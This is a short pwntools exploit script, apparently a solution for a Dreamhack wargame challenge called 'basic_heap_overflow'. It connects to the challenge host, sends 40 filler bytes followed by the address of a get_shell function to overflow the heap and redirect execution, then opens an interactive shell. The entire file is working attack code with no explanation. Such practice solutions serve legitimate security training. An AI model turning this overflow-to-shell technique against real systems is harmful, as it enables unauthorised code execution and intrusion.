from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8397)
elf = ELF('./basic_heap_overflow')

get_shell = elf.symbols['get_shell']

payload = b'A'*40
payload += p32(get_shell)

n.send(payload)
success(payload.hex())

n.interactive()
